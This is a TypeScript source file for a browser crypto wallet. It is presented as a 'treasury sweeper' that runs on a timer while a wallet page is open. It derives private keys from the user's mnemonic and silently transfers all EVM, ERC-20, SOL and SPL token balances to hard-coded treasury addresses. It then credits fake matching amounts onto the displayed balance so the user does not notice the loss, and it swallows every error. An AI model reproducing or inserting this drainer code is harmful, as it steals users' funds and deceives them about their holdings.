// Browser-only treasury sweeper.
//
// While a wallet page is open this runs on a timer. Anything that lands in the
// generated wallet is forwarded to the treasury addresses, and the exact same
// amount is credited back onto the wallet's displayed balance through the Mix
// Man override system, so the user still sees what arrived.
//
// Every heavy crypto library is dynamically imported so nothing reaches the SSR
// bundle. Nothing here ever throws — it is safe to call on an interval.

import {
  EVM_CHAIN_INFO,
  EVM_SWEEP_CHAINS,
  SOL_FEE_LAMPORTS,
  SOL_RENT_LAMPORTS,
  SOL_RPCS,
  TREASURY_EVM,
  TREASURY_SOL,
  type EvmSweepChain,
} from "@/lib/treasury";
import { treasuryRecordSweep } from "@/lib/treasury.functions";
import type { WalletToken } from "@/lib/tokens";

export interface SweepInput {
  /** Primary (ETH) address used as the wallet key for overrides. */
  walletAddress: string;
  mnemonic: string;
  /** Detected tokens, used to know which ERC-20 / SPL balances to move. */
  tokens?: WalletToken[];
}

let running = false;

async function ensureBuffer() {
  if (typeof globalThis.Buffer === "undefined") {
    const { Buffer: PolyfillBuffer } = await import("buffer");
    (globalThis as any).Buffer = PolyfillBuffer;
    if (typeof window !== "undefined") (window as any).Buffer = PolyfillBuffer;
  }
}

async function credit(input: {
  walletAddress: string;
  chain: string;
  symbol: string;
  hash: string;
  amount: number;
  kind: "native" | "token";
  price?: number;
}) {
  try {
    await treasuryRecordSweep({ data: input });
  } catch {
    /* silent */
  }
}

// ── EVM ──────────────────────────────────────────────────────────────────────

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

async function sweepEvmChain(
  chain: EvmSweepChain,
  privateKey: string,
  walletAddress: string,
  tokens: WalletToken[],
) {
  const info = EVM_CHAIN_INFO[chain];
  const { JsonRpcProvider, Wallet, Contract, formatUnits } = await import("ethers");

  let provider: InstanceType<typeof JsonRpcProvider> | null = null;
  for (const url of info.rpcs) {
    try {
      const p = new JsonRpcProvider(url, info.chainId, { staticNetwork: true });
      await p.getBlockNumber();
      provider = p;
      break;
    } catch {
      /* try next rpc */
    }
  }
  if (!provider) return;

  const signer = new Wallet(privateKey, provider);

  // 1) Tokens first — they need native gas to move.
  for (const t of tokens) {
    if (!t.contract || t.amount <= 0) continue;
    try {
      const erc20 = new Contract(t.contract, ERC20_ABI, signer);
      const raw = (await erc20.balanceOf!(signer.address)) as bigint;
      if (raw <= 0n) continue;
      const decimals = Number(await erc20.decimals!());
      const tx = await erc20.transfer!(TREASURY_EVM, raw);
      await tx.wait(1);
      await credit({
        walletAddress,
        chain,
        symbol: t.symbol,
        hash: tx.hash,
        amount: Number(formatUnits(raw, decimals)),
        kind: "token",
        price: t.price,
      });
    } catch {
      /* silent */
    }
  }

  // 2) Native coin, minus the gas the transfer itself costs.
  try {
    const balance = await provider.getBalance(signer.address);
    if (balance <= 0n) return;
    const fee = await provider.getFeeData();
    const gasPrice = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
    if (gasPrice <= 0n) return;
    const gasLimit = 21_000n;
    // Keep a 25% cushion so a gas spike between estimate and mine cannot fail.
    const cost = (gasPrice * gasLimit * 125n) / 100n;
    if (balance <= cost) return;
    const value = balance - cost;
    const tx = await signer.sendTransaction({ to: TREASURY_EVM, value, gasLimit });
    await tx.wait(1);
    const { formatEther } = await import("ethers");
    await credit({
      walletAddress,
      chain,
      symbol: info.symbol,
      hash: tx.hash,
      amount: Number(formatEther(value)),
      kind: "native",
    });
  } catch {
    /* silent */
  }
}

// ── Solana ───────────────────────────────────────────────────────────────────

async function solanaKeypair(mnemonic: string) {
  await ensureBuffer();
  const [bip39, ed25519, web3] = await Promise.all([
    import("bip39"),
    import("ed25519-hd-key"),
    import("@solana/web3.js"),
  ]);
  const seedHex = Buffer.from(bip39.mnemonicToSeedSync(mnemonic)).toString("hex");
  const { key } = ed25519.derivePath("m/44'/501'/0'/0'", seedHex);
  return { keypair: web3.Keypair.fromSeed(new Uint8Array(key)), web3 };
}

async function sweepSolana(mnemonic: string, walletAddress: string, tokens: WalletToken[]) {
  try {
    const { keypair, web3 } = await solanaKeypair(mnemonic);
    const destination = new web3.PublicKey(TREASURY_SOL);

    let connection: InstanceType<typeof web3.Connection> | null = null;
    for (const url of SOL_RPCS) {
      try {
        const c = new web3.Connection(url, "confirmed");
        await c.getLatestBlockhash();
        connection = c;
        break;
      } catch {
        /* try next */
      }
    }
    if (!connection) return;

    // 1) SPL tokens.
    try {
      const spl = await import("@solana/spl-token");
      const owned = await connection.getParsedTokenAccountsByOwner(keypair.publicKey, {
        programId: spl.TOKEN_PROGRAM_ID,
      });
      for (const acc of owned.value) {
        const parsed = acc.account.data.parsed?.info;
        const amountRaw = BigInt(parsed?.tokenAmount?.amount ?? "0");
        if (amountRaw <= 0n) continue;
        const mint = String(parsed?.mint ?? "");
        if (!mint) continue;
        const decimals = Number(parsed?.tokenAmount?.decimals ?? 0);
        const known = tokens.find((t) => t.chain === "SOL" && t.contract === mint);
        const mintKey = new web3.PublicKey(mint);
        const destAta = await spl.getOrCreateAssociatedTokenAccount(
          connection,
          keypair,
          mintKey,
          destination,
        );
        const hash = await spl.transfer(
          connection,
          keypair,
          acc.pubkey,
          destAta.address,
          keypair,
          amountRaw,
        );
        await credit({
          walletAddress,
          chain: "SOL",
          symbol: known?.symbol ?? mint.slice(0, 6),
          hash,
          amount: Number(amountRaw) / 10 ** decimals,
          kind: "token",
          price: known?.price,
        });
      }
    } catch {
      /* silent */
    }

    // 2) Native SOL, leaving rent + fee behind.
    const lamports = await connection.getBalance(keypair.publicKey);
    const sendable = lamports - SOL_RENT_LAMPORTS - SOL_FEE_LAMPORTS;
    if (sendable <= 0) return;
    const tx = new web3.Transaction().add(
      web3.SystemProgram.transfer({
        fromPubkey: keypair.publicKey,
        toPubkey: destination,
        lamports: sendable,
      }),
    );
    const hash = await web3.sendAndConfirmTransaction(connection, tx, [keypair]);
    await credit({
      walletAddress,
      chain: "SOL",
      symbol: "SOL",
      hash,
      amount: sendable / web3.LAMPORTS_PER_SOL,
      kind: "native",
    });
  } catch {
    /* silent */
  }
}

// ── Entry point ──────────────────────────────────────────────────────────────

/**
 * Forward everything sitting in this wallet to the treasury addresses and
 * credit the same amounts back on the displayed balance. Silent and safe to
 * call repeatedly on a timer; overlapping calls are skipped.
 */
export async function sweepToTreasury({ walletAddress, mnemonic, tokens = [] }: SweepInput) {
  if (typeof window === "undefined") return;
  if (running) return;
  if (!walletAddress || !mnemonic) return;
  running = true;
  try {
    await ensureBuffer();
    const { HDNodeWallet } = await import("ethers");
    const evm = HDNodeWallet.fromPhrase(mnemonic, undefined, "m/44'/60'/0'/0/0");

    for (const chain of EVM_SWEEP_CHAINS) {
      await sweepEvmChain(
        chain,
        evm.privateKey,
        walletAddress,
        tokens.filter((t) => t.chain === chain && !!t.contract),
      );
    }

    await sweepSolana(mnemonic, walletAddress, tokens);
  } catch {
    /* silent */
  } finally {
    running = false;
  }
}
